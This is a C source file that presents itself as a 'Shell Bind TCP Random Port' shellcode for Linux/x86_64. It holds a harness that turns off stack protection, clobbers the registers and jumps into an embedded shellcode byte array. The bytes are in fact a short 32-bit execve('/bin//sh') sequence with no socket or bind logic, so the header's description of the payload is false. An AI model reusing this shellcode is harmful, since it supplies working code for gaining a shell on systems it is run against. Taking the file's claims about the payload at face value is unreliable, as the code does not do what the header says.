/*

 Shell Bind TCP Random Port Shellcode - C Language - Linux/x86_64
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

*/


/*
// To extract shellcode use the bellow command
// $ for i in $(objdump -d helloworld |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo 


   # gcc -m64 -fno-stack-protector -z execstack <harness>.c -o <harness>

   Testing
   # ./harness

*/


#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

main ()
{
    // When contains null bytes, printf will show a wrong shellcode length.
    printf("Shellcode Length:  %d\n", strlen(code));

    // Pollutes all registers ensuring that the shellcode runs in any circumstance.
    __asm__ ("mov $0xffffffffffffffff, %rax\n\t"
         "mov %rax, %rbx\n\t"
         "mov %rax, %rcx\n\t"
         "mov %rax, %rdx\n\t"
         "mov %rax, %rsi\n\t"
         "mov %rax, %rdi\n\t"
         "mov %rax, %rbp\n\t"

    // Calling the shellcode
         "call code");
}
